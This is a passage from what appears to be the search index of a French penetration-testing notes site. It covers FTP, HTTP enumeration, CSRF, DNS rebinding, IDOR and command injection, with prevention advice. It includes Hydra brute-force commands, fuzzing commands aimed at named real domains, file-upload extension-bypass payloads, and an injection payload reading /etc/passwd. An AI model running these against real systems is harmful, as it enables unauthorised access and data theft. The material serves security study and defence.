:</p> <pre><code>nc -nv $ip 21\n</code></pre> <p>Connection avec openssl (si le serveur utilise SSL/TLS):</p> <pre><code>openssl s_client -connect $ip:21 -starttls ftp\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#bruteforce","title":"Bruteforce","text":"<p>Bruteforce user :</p> <pre><code>hydra -L /usr/list/user.txt -p password1234 $ip ftp\n</code></pre> <p>Bruteforce password :</p> <pre><code>hydra -l user -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip ftp\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#configuration-potentiellement-dangereuse","title":"Configuration potentiellement dangereuse","text":""},{"location":"Red%20Team/2%20-%20Services/FTP/G%C3%A9n%C3%A9ralit%C3%A9s/#-vsftpd","title":"- VSFTPd","text":"Settings Descriptions anonymous_enable=YES Permet l'identification en Anonymous anon_upload_enable=YES Permet \u00e0 l'utilisateur Anonymous d'uploader anon_mkdir_write_enable=YES Permet \u00e0 l'utilisateur Anonymous de cr\u00e9er un dossier no_anon_password=YES Ne pas demander de password \u00e0 l'utilisateur Anonymous anon_root=/home/username/ftp Le r\u00e9pertoire de l'utilisateur Anonymous write_enable=YES Autorise l'usage des commandes: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?"},{"location":"Red%20Team/2%20-%20Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/","title":"Enum\u00e9ration g\u00e9n\u00e9rale","text":"<p>Informations sur le serveur utilis\u00e9, les technologies (php, js...), le CMS... :</p> <pre><code>whatweb -a3 https://$domain -v\n</code></pre> <p>R\u00e9cup\u00e9rer le HEADER HTTP :</p> <pre><code>curl -I \"http://$domain\"\n</code></pre> <p>Savoir si il y a un firewall applicatif web (WAF) :</p> <pre><code>wafw00f -v https://www.tesla.com\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Enum%C3%A9ration%20g%C3%A9n%C3%A9rale/#fuzzing","title":"Fuzzing","text":"<p>R\u00e9pertoires : <pre><code>gobuster dir -u http://domain.com -w /usr/share/wordlist/dirb/big.txt\n---\nferoxbuster http://domain.com\n---\nffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ\n</code></pre></p> <p>Fuzzing extensions :</p> <pre><code>ffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ\n</code></pre> <p>Fuzzing de pages web :</p> <pre><code>ffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php\n</code></pre> <p>Fuzzing r\u00e9cursif (ici r\u00e9cursivit\u00e9 sur un niveau, et tentes de trouver des fichiers .php) :</p> <pre><code>ffuf -w /usr/share/wordlist/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v\n</code></pre> <p>Fuzzing LFI :</p> <pre><code>ffuf -w /usr/share/wordlist/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287\n</code></pre> <p>Fuzzing param\u00e8tres :</p> <pre><code>ffuf -w /usr/share/wordlist/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Reconnaissance%20de%20domaine/","title":"Reconnaissance de domaine","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/Reconnaissance%20de%20domaine/#certificats","title":"Certificats","text":"<p>Informations certificat:</p> <pre><code>export TARGET=\"facebook.com\"\ncurl -s \"https://crt.sh/?q=${TARGET}&amp;output=json\" | jq -r '.[] | \"\\(.name_value)\\n\\(.common_name)\"' | sort -u &gt; \"${TARGET}_crt.sh.txt\"\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Reconnaissance%20de%20domaine/#subdomains","title":"Subdomains","text":"<p>Utiliser harvester pour trouver des subdomains sur diff\u00e9rents moteurs de recherche:</p> <pre><code>export TARGET=\"facebook.com\"\ncat sources.txt | while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}_${TARGET}\";done\n\nsources.txt:\nbaidu\nbufferoverun\ncrtsh\nhackertarget\notx\nprojecdiscovery\nrapiddns\nsublist3r\nthreatcrowd\ntrello\nurlscan\nvhost\nvirustotal\nzoomeye\n</code></pre> <p>Brute force DNS avec gobuster:</p> <pre><code>export TARGET=\"facebook.com\"\nexport NS=\"d.ns.facebook.com\"\nexport WORDLIST=\"numbers.txt\"\ngobuster dns -q -r \"${NS}\" -d \"${TARGET}\" -w \"${WORDLIST}\" -p ./patterns.txt -o \"gobuster_${TARGET}.txt\"\n</code></pre> <p>Fuzzing vHost (remplacer la valeur de \"fs\" par la taille d'un faux positif):</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$ip -H \"HOST: FUZZ.$domain\" -fs 10918\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Verb%20Tampering/","title":"Verb Tampering","text":"Cat\u00e9gorie Information TTP Modification ou abus des m\u00e9thodes (verbes) HTTP CWE CWE-275 (Permission Issues) Description de l'attaque HTTP Verb Tampering implique l'exploitation de la gestion inad\u00e9quate des m\u00e9thodes HTTP (comme GET, POST, DELETE) par une application web. Cela peut permettre \u00e0 un attaquant d'acc\u00e9der \u00e0 des fonctionnalit\u00e9s non autoris\u00e9es ou de contourner les contr\u00f4les de s\u00e9curit\u00e9. Impacts potentiels - Acc\u00e8s ou modification non autoris\u00e9e des donn\u00e9es- Bypass des restrictions d'acc\u00e8s- Ex\u00e9cution d'actions non autoris\u00e9es Comment la d\u00e9tecter - Analyse de s\u00e9curit\u00e9 des configurations de serveur web- Tests de p\u00e9n\u00e9tration ciblant la gestion des m\u00e9thodes HTTP- Revue de code pour la gestion des m\u00e9thodes HTTP Rem\u00e9diations/mitigations - Restriction et s\u00e9curisation de l'utilisation des m\u00e9thodes HTTP dans les applications web- Impl\u00e9mentation de contr\u00f4les d'acc\u00e8s et de validation appropri\u00e9s pour chaque m\u00e9thode HTTP- Utilisation de pare-feux d'applications web (WAF) pour filtrer les requ\u00eates malveillantes Lien de r\u00e9f\u00e9rence OWASP - Testing for HTTP Verb Tampering"},{"location":"Red%20Team/2%20-%20Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Le Cross-Site Request Forgery (CSRF) est une vuln\u00e9rabilit\u00e9 web qui permet \u00e0 un attaquant de faire effectuer des actions ind\u00e9sirables \u00e0 un utilisateur authentifi\u00e9 sur une application web, sans que cet utilisateur en soit conscient. Les actions sont ex\u00e9cut\u00e9es avec les privil\u00e8ges de l'utilisateur authentifi\u00e9, ce qui peut entra\u00eener des cons\u00e9quences graves, telles que des modifications non autoris\u00e9es de donn\u00e9es ou des actions non intentionnelles sur l'application cible.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-csrf","title":"Exemple d'Attaque CSRF","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Un utilisateur est authentifi\u00e9 sur un site web (par exemple, <code>https://example.com</code>).</li> <li>L'attaquant envoie un lien ou une image malveillante \u00e0 l'utilisateur, souvent via email ou un autre site web.</li> <li>Lorsque l'utilisateur clique sur le lien ou visite la page contenant l'image malveillante, une requ\u00eate est envoy\u00e9e au site web sur lequel il est authentifi\u00e9.</li> </ul> <p>Exemple de code malveillant :</p> <pre><code>&lt;!-- Exemple d'image HTML --&gt;\n&lt;img src=\"https://example.com/transfer?amount=1000&amp;to=attacker_account\" style=\"display:none\"&gt;\n</code></pre> <p>Ce code envoie une requ\u00eate GET \u00e0 <code>https://example.com/transfer</code> avec les param\u00e8tres sp\u00e9cifi\u00e9s, ex\u00e9cutant ainsi une action de transfert d'argent sans le consentement de l'utilisateur.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-csrf","title":"Pr\u00e9vention des Attaques CSRF","text":"<p>Utilisation de Tokens CSRF :</p> <ul> <li>Impl\u00e9menter des tokens CSRF dans les formulaires et les requ\u00eates sensibles. Ces tokens doivent \u00eatre uniques pour chaque session utilisateur et v\u00e9rifi\u00e9s par le serveur avant d'ex\u00e9cuter des actions sensibles.</li> </ul> <pre><code>&lt;form action=\"/transfer\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"csrf_token\" value=\"unique_csrf_token\"&gt; Montant: &lt;input type=\"text\" name=\"amount\"&gt; Compte: &lt;input type=\"text\" name=\"to_account\"&gt; &lt;input type=\"submit\" value=\"Transf\u00e9rer\"&gt; &lt;/form&gt;\n</code></pre> <p>V\u00e9rification des En-t\u00eates de R\u00e9f\u00e9rents :</p> <ul> <li>V\u00e9rifier l'en-t\u00eate HTTP Referer pour s'assurer que la requ\u00eate provient d'une page l\u00e9gitime de votre domaine.</li> </ul> <pre><code>if (isset($_SERVER['HTTP_REFERER']) &amp;&amp; parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) === 'example.com') { // Requ\u00eate l\u00e9gitime } else { // Requ\u00eate potentiellement malveillante }\n</code></pre> <p>Utilisation de M\u00e9thodes HTTP Appropri\u00e9es :  - Restreindre les actions sensibles aux m\u00e9thodes POST, PUT, DELETE, etc., plut\u00f4t que GET. Les requ\u00eates GET ne doivent pas modifier l'\u00e9tat du serveur.</p> <p>D\u00e9tection et Annulation des Sessions Doubles :</p> <ul> <li>D\u00e9tecter les sessions doubles et les annuler, ou exiger une r\u00e9-authentification pour les actions sensibles.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/CSRF/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-csrf","title":"D\u00e9tection des Failles CSRF","text":"<p>Revue de Code :</p> <ul> <li>Analyser le code source de l'application pour v\u00e9rifier l'absence de protection CSRF sur les formulaires et les requ\u00eates sensibles.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Cr\u00e9er des requ\u00eates malveillantes similaires \u00e0 celles d\u00e9crites dans l'exemple et les ex\u00e9cuter pour voir si l'application est vuln\u00e9rable.</li> </ul> <p>Utilisation d'Outils d'Analyse :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 web automatis\u00e9s qui incluent des tests de CSRF, tels que OWASP ZAP ou Burp Suite.</li> </ul> Cat\u00e9gorie Information TTP Induire les utilisateurs \u00e0 effectuer des actions non d\u00e9sir\u00e9es sur un site Web o\u00f9 ils sont authentifi\u00e9s CWE CWE-352 (Cross-Site Request Forgery (CSRF)) Description de l'attaque CSRF exploite la confiance qu'un site web a envers le navigateur de l'utilisateur. L'attaque force l'utilisateur \u00e0 ex\u00e9cuter des actions non d\u00e9sir\u00e9es sur un site web o\u00f9 il est authentifi\u00e9, typiquement via un lien malveillant ou un script dans une autre page. Impacts potentiels - Actions non autoris\u00e9es effectu\u00e9es au nom de l'utilisateur- Modification de param\u00e8tres de compte- Potentiel de transactions malveillantes Comment la d\u00e9tecter - Analyse de code pour les formulaires et requ\u00eates sans jetons de validation CSRF- Tests de p\u00e9n\u00e9tration pour identifier les vuln\u00e9rabilit\u00e9s CSRF- Surveillance des journaux de serveur web pour des mod\u00e8les de requ\u00eate inhabituels Rem\u00e9diations/mitigations - Utilisation de jetons anti-CSRF dans les formulaires- V\u00e9rification de l'origine des requ\u00eates avec des ent\u00eates HTTP appropri\u00e9s- Mise en \u0153uvre de politiques de s\u00e9curit\u00e9 de contenu strictes- Sensibilisation des utilisateurs aux liens et aux pi\u00e8ces jointes suspectes Lien de r\u00e9f\u00e9rence OWASP - Cross-Site Request Forgery (CSRF)"},{"location":"Red%20Team/2%20-%20Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Le DNS Rebinding est une vuln\u00e9rabilit\u00e9 qui permet \u00e0 un attaquant de contourner les politiques de s\u00e9curit\u00e9 de m\u00eame origine (Same-Origin Policy) et de prendre le contr\u00f4le d'un navigateur web pour communiquer avec des syst\u00e8mes prot\u00e9g\u00e9s sur le r\u00e9seau local de l'utilisateur. Cette attaque exploite le m\u00e9canisme de r\u00e9solution DNS pour manipuler l'adresse IP r\u00e9solue pour un nom de domaine, permettant \u00e0 l'attaquant de rediriger le trafic vers une adresse IP diff\u00e9rente, souvent celle du r\u00e9seau local de la victime.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-dns-rebinding","title":"Exemple d'Attaque DNS Rebinding","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>L'attaquant enregistre un domaine (par exemple, <code>attacker.com</code>) et configure un serveur DNS malveillant pour r\u00e9pondre aux requ\u00eates de ce domaine.</li> <li>L'utilisateur visite une page web contr\u00f4l\u00e9e par l'attaquant.</li> <li>Le serveur DNS malveillant r\u00e9pond initialement avec une adresse IP contr\u00f4l\u00e9e par l'attaquant.</li> <li>Apr\u00e8s une courte p\u00e9riode, le serveur DNS change l'adresse IP pour une adresse interne du r\u00e9seau local de la victime (par exemple, <code>192.168.0.1</code>).</li> </ul> <p>Exemple de code malveillant :</p> <pre><code>&lt;script&gt; // JavaScript malveillant pour une attaque de DNS Rebinding \nvar img = new Image(); img.src = \"http://attacker.com:8080\"; // Premi\u00e8re requ\u00eate vers l'adresse IP contr\u00f4l\u00e9e par l'attaquant \nsetTimeout(function() { img.src = \"http://192.168.0.1:8080\"; // Requ\u00eate vers l'adresse IP interne \n}, 2000); \n&lt;/script&gt;\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-dns-rebinding","title":"Pr\u00e9vention des Attaques DNS Rebinding","text":"<p>Restrictions au Niveau du Navigateur :</p> <ul> <li>Utiliser des extensions ou des configurations de navigateur pour restreindre l'acc\u00e8s aux adresses IP locales depuis des scripts externes.</li> </ul> <p>Validation des Adresses IP :</p> <ul> <li>Configurer les applications web pour v\u00e9rifier que les requ\u00eates proviennent de noms de domaine ou d'adresses IP attendues.</li> </ul> <pre><code>if ($_SERVER['REMOTE_ADDR'] !== '192.168.0.1') \n{ \n// Requ\u00eate l\u00e9gitime \n} \nelse \n{ \n// Requ\u00eate potentiellement malveillante \n}\n</code></pre> <p>Filtres de Pare-feu :</p> <ul> <li>Utiliser des pare-feux pour filtrer les requ\u00eates HTTP provenant du r\u00e9seau local vers des adresses internes.</li> </ul> <p>Limitation des Dur\u00e9es de Cache DNS :</p> <ul> <li>Configurer de courtes dur\u00e9es de cache (TTL) pour les enregistrements DNS, ce qui r\u00e9duit l'impact des attaques de DNS Rebinding.</li> </ul> <p>Utilisation de DNSSEC :</p> <ul> <li>Mettre en \u0153uvre DNSSEC (DNS Security Extensions) pour garantir l'int\u00e9grit\u00e9 des r\u00e9ponses DNS.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-dns-rebinding","title":"D\u00e9tection des Failles DNS Rebinding","text":"<p>Surveillance des Requ\u00eates DNS :</p> <ul> <li>Surveiller les requ\u00eates DNS pour d\u00e9tecter les mod\u00e8les de requ\u00eates suspectes ou les r\u00e9solutions d'adresses IP internes.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en utilisant des scripts de rebinding DNS pour v\u00e9rifier si les applications internes sont accessibles.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 pour analyser et d\u00e9tecter les vuln\u00e9rabilit\u00e9s de DNS Rebinding, tels que Burp Suite ou des scripts personnalis\u00e9s.</li> </ul> Cat\u00e9gorie Information TTP Exploitation de la politique de m\u00eame origine par la manipulation des enregistrements DNS CWE CWE-346 (Origin Validation Error) Description de l'attaque Le DNS Rebinding exploite la fa\u00e7on dont les navigateurs web appliquent la politique de m\u00eame origine. L'attaque manipule le DNS pour faire croire au navigateur qu'une source fiable lui demande de se connecter \u00e0 un syst\u00e8me malveillant. Impacts potentiels - Contournement des politiques de s\u00e9curit\u00e9 du navigateur- Acc\u00e8s non autoris\u00e9 aux syst\u00e8mes internes- Possibilit\u00e9 d'ex\u00e9cution de code malveillant Comment la d\u00e9tecter - Analyse des journaux DNS pour identifier des changements rapides d'adresse IP- Utilisation de solutions de d\u00e9tection d'intrusion r\u00e9seau- Surveillance des activit\u00e9s suspectes sur le r\u00e9seau Rem\u00e9diations/mitigations - Mise en \u0153uvre de politiques de s\u00e9curit\u00e9 DNS strictes- Configuration des navigateurs et des serveurs pour pr\u00e9venir les abus- Utilisation de pare-feu et de syst\u00e8mes de d\u00e9tection d'intrusion pour filtrer le trafic suspect Lien de r\u00e9f\u00e9rence OWASP - DNS Rebinding"},{"location":"Red%20Team/2%20-%20Services/HTTP/Drupal/Enum%C3%A9ration/","title":"Enum\u00e9ration","text":"<pre><code>droopescan scan drupal -u http://drupal.inlanefreight.local\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/File%20upload/Payloads/","title":"Payloads","text":"<p>Extensions alternatives:</p> <pre><code>PHP: php, php2, php3, php4, php5, php6, php7, phps, pht, phtml, pgif, shtml, phar, inc, hphp, ctp, module\n\nASP: asp, aspx, config, ashx, asmx, aspq, axd, cshtm, cshtml, rem, soap, vbhtm, vbhtml, asa, cer, shtml\n\nJsp: jsp, jspx, jsw, jsv, jspf, wss, dp, action\n\nPerl: pl, cgi\n</code></pre> <p>Bypass check extension:</p> <pre><code>test.png.php\n---\ntest.php%20\ntest.php%0a\ntest.php%00\ntest.php%0d%0a\ntest.php/\ntest.php.\\\ntest.pHp5\n---\ntest.png.pHp5\ntest.php#.png\ntest.php%00.png\ntest.php\\x00.png\ntest.php%0a.png\ntest.php%0d%0a.png\ntest.phpJunk123png\n---\ntest.php.jpg.php\ntest.php%00.png%%00.jpg\netc...\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles IDOR (Insecure Direct Object Reference) se produisent lorsqu'une application permet un acc\u00e8s direct \u00e0 des objets ou des ressources bas\u00e9es sur une entr\u00e9e fournie par l'utilisateur sans v\u00e9rification suffisante des permissions. Cela permet \u00e0 un attaquant d'acc\u00e9der \u00e0 des donn\u00e9es ou des fonctionnalit\u00e9s auxquelles il ne devrait pas avoir acc\u00e8s en manipulant simplement les r\u00e9f\u00e9rences aux objets dans les requ\u00eates.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-idor","title":"Exemple d'Attaque IDOR","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Un utilisateur authentifi\u00e9 acc\u00e8de \u00e0 ses propres informations via une URL telle que <code>https://example.com/user/profile?id=123</code>.</li> <li>Un attaquant modifie le param\u00e8tre <code>id</code> pour acc\u00e9der aux informations d'autres utilisateurs, par exemple <code>https://example.com/user/profile?id=124</code>.</li> </ul> <p>Exemple de requ\u00eate malveillante :</p> <pre><code>GET /user/profile?id=124 HTTP/1.1 Host: example.com \nCookie: sessionid=attacker_session_id\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-idor","title":"Pr\u00e9vention des Attaques IDOR","text":"<p>V\u00e9rification des Permissions :</p> <p>Toujours v\u00e9rifier que l'utilisateur a les permissions n\u00e9cessaires pour acc\u00e9der \u00e0 la ressource demand\u00e9e.</p> <pre><code>session_start(); \n$userId = $_SESSION['user_id']; \n$requestedId = $_GET['id']; // V\u00e9rifier que l'utilisateur a le droit d'acc\u00e9der \u00e0 la ressource \nif ($userId !== $requestedId) { die(\"Acc\u00e8s refus\u00e9.\"); }\n</code></pre> <p>Utilisation de R\u00e9f\u00e9rences Indirectes :</p> <ul> <li>Utiliser des r\u00e9f\u00e9rences indirectes ou des tokens \u00e0 la place des identifiants directs dans les URL et les formulaires.</li> </ul> <pre><code>// G\u00e9n\u00e9rer un token pour chaque utilisateur \n$token = base64_encode(random_bytes(16)); \n$_SESSION['token'] = $token; // Utiliser le token dans les URL \necho \"&lt;a href='profile.php?token=$token'&gt;Mon Profil&lt;/a&gt;\";\n</code></pre> <p>Contr\u00f4le d'Acc\u00e8s au Niveau de l'Application :</p> <ul> <li>Impl\u00e9menter des contr\u00f4les d'acc\u00e8s rigoureux au niveau de l'application pour toutes les op\u00e9rations sensibles.</li> </ul> <pre><code>// Exemple avec un framework MVC \nclass UserController extends Controller \n{ public function profile($id) { \n$user = User::find($id); \nif ($user-&gt;id !== Auth::user()-&gt;id) { \nabort(403, 'Acc\u00e8s refus\u00e9'); \n} \nreturn view('profile', compact('user')); } }\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-idor","title":"D\u00e9tection des Failles IDOR","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les r\u00e9f\u00e9rences directes aux objets et v\u00e9rifier la pr\u00e9sence de contr\u00f4les d'acc\u00e8s appropri\u00e9s.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en modifiant les param\u00e8tres des requ\u00eates pour v\u00e9rifier si des donn\u00e9es non autoris\u00e9es peuvent \u00eatre acc\u00e9d\u00e9es.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles IDOR.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-references-indirectes-securisees","title":"Exemples de R\u00e9f\u00e9rences Indirectes S\u00e9curis\u00e9es","text":"<p>Utilisation de UUID :</p> <ul> <li>Utiliser des identifiants universels uniques (UUID) au lieu d'identifiants s\u00e9quentiels.</li> </ul> <pre><code>// G\u00e9n\u00e9rer un UUID pour l'utilisateur \n$uuid = bin2hex(random_bytes(16)); // Associer l'UUID \u00e0 l'utilisateur dans la base de donn\u00e9es\n</code></pre> <p>Mapping des R\u00e9f\u00e9rences :</p> <ul> <li>Utiliser une table de mapping pour g\u00e9rer les r\u00e9f\u00e9rences entre les identifiants publics et priv\u00e9s.</li> </ul> <pre><code>// Table de mapping des tokens et des ID utilisateur \n$token = $_GET['token']; \n$userId = getUserIdFromToken($token); \n\nfunction getUserIdFromToken($token) { \n// Rechercher l'ID utilisateur correspondant au token dans la base de donn\u00e9es \n$stmt = $pdo-&gt;prepare(\"SELECT user_id FROM tokens WHERE token = ?\"); \n$stmt-&gt;execute([$token]); \nreturn $stmt-&gt;fetchColumn(); }\n</code></pre> Cat\u00e9gorie Information TTP R\u00e9f\u00e9rence directe \u00e0 un objet non s\u00e9curis\u00e9 CWE CWE-639 (Authorization Bypass Through User-Controlled Key) Description de l'attaque IDOR se produit lorsqu'une application fournit un acc\u00e8s direct \u00e0 des objets en se basant sur des entr\u00e9es fournies par l'utilisateur, sans v\u00e9rification suffisante de l'autorisation. Cela peut permettre \u00e0 un attaquant d'acc\u00e9der \u00e0 des donn\u00e9es auxquelles il ne devrait normalement pas avoir acc\u00e8s. Impacts potentiels - Acc\u00e8s non autoris\u00e9 \u00e0 des donn\u00e9es sensibles- Modification ou suppression de donn\u00e9es- Violation de la confidentialit\u00e9 des donn\u00e9es Comment la d\u00e9tecter - Tests de p\u00e9n\u00e9tration manuels- Analyse des journaux d'acc\u00e8s pour des acc\u00e8s anormaux- Utilisation de scanners automatiques de vuln\u00e9rabilit\u00e9 Rem\u00e9diations/mitigations - Mise en \u0153uvre d'une v\u00e9rification syst\u00e9matique des autorisations pour chaque acc\u00e8s aux donn\u00e9es- Utilisation de tokens de session et de contr\u00f4les d'acc\u00e8s bas\u00e9s sur les r\u00f4les- Sensibilisation des d\u00e9veloppeurs \u00e0 cette vuln\u00e9rabilit\u00e9 lors de la conception de l'application Lien de r\u00e9f\u00e9rence OWASP - Insecure Direct Object References"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'injection de commandes se produisent lorsque des applications acceptent des entr\u00e9es non s\u00e9curis\u00e9es et les transmettent \u00e0 un interpr\u00e9teur de commandes (shell) pour ex\u00e9cution. Cela permet \u00e0 un attaquant d'ex\u00e9cuter des commandes arbitraires sur le syst\u00e8me h\u00f4te avec les privil\u00e8ges de l'application vuln\u00e9rable, conduisant \u00e0 la compromission du syst\u00e8me, \u00e0 la divulgation de donn\u00e9es sensibles, ou \u00e0 des dommages importants.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-par-injection-de-commandes","title":"Exemple d'Attaque par Injection de Commandes","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web prend une entr\u00e9e utilisateur et l'utilise directement dans une commande syst\u00e8me sans validation ou \u00e9chappement ad\u00e9quat.</li> </ul> <p>*Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php $domain = $_GET['domain']; \necho shell_exec(\"nslookup \" . $domain); \n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut injecter des commandes suppl\u00e9mentaires via l'entr\u00e9e utilisateur, par exemple <code>domain=example.com; cat /etc/passwd</code>.</li> </ul> <pre><code>GET /nslookup.php?domain=example.com;cat+/etc/passwd HTTP/1.1 \nHost: example.com\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-dinjection-de-commandes","title":"Pr\u00e9vention des Attaques d'Injection de Commandes","text":"<p>Validation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur pour ne permettre que des caract\u00e8res et des formats attendus.</li> </ul> <pre><code>$domain = filter_var($_GET['domain'], FILTER_VALIDATE_DOMAIN); \nif ($domain === false) { \ndie(\"Nom de domaine non valide.\"); \n}\n</code></pre> <p>Utilisation de Fonctions Syst\u00e8me S\u00e9curis\u00e9es :</p> <ul> <li>Utiliser des API ou des fonctions de biblioth\u00e8ques qui n'interagissent pas directement avec le shell syst\u00e8me.</li> </ul> <pre><code>$output = dns_get_record($domain, DNS_A);\n</code></pre> <p>Echappement des Entr\u00e9es :</p> <ul> <li>\u00c9chapper les caract\u00e8res sp\u00e9ciaux dans les entr\u00e9es utilisateur avant de les utiliser dans des commandes syst\u00e8me.</li> </ul> <pre><code>$domain = escapeshellarg($_GET['domain']); \necho shell_exec(\"nslookup \" . $domain);\n</code></pre> <p>Principle of Least Privilege :</p> <ul> <li>Ex\u00e9cuter les commandes avec des privil\u00e8ges minimaux n\u00e9cessaires pour r\u00e9duire l'impact des injections potentielles.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-dinjection-de-commandes","title":"D\u00e9tection des Failles d'Injection de Commandes","text":"<p>Revue de Code :</p> <p>Analyser le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont utilis\u00e9es dans des commandes syst\u00e8me.</p> <p>Tests Manuels :</p> <p>Tester manuellement en essayant d'injecter des commandes dans les param\u00e8tres des requ\u00eates pour identifier les vuln\u00e9rabilit\u00e9s.</p> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <p>Utiliser des outils d'analyse statique et dynamique pour d\u00e9tecter les injections de commandes, tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques \u00e0 l'injection de commandes.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Validation stricte des Entr\u00e9es :</p> <pre><code>if (preg_match('/^[a-zA-Z0-9.-]+$/', $_GET['domain'])) { \n$domain = $_GET['domain']; \n} else { \ndie(\"Nom de domaine non valide.\"); \n}\n</code></pre> <p>Utilisation de Biblioth\u00e8ques S\u00e9curis\u00e9es 